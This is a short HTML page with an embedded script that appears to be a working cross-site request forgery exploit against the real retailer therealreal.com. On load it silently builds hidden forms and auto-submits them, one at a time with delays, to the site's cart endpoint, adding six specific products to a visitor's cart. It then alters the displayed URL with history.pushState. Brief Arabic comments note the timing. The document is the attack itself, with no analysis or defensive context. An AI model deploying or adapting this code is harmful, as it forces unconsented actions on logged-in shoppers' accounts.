<html>
<body>

<script>
const products = [
  "49819745", 
  "49830387",
  "49994478",
  "49774605",
  "49697574",
  "49814554",
];

function addProduct(id, delay) {
  setTimeout(() => {

    const form = document.createElement("form");
    form.method = "POST";
    form.action = "https://www.therealreal.com/cart/items";

    const fields = {
      id: id,
      _analytics_session_id: "1772670266203",
      return_product_id: "",
      protection_product_id: ""
    };

    for (const key in fields) {
      const input = document.createElement("input");
      input.type = "hidden";
      input.name = key;
      input.value = fields[key];
      form.appendChild(input);
    }

    document.body.appendChild(form);
    form.submit();

  }, delay);
}

// إرسال الطلبات واحدة واحدة
products.forEach((id, index) => {
  addProduct(id, index * 1200); // delay مهم
});

history.pushState('', '', '/');

</script>

</body>
</html>
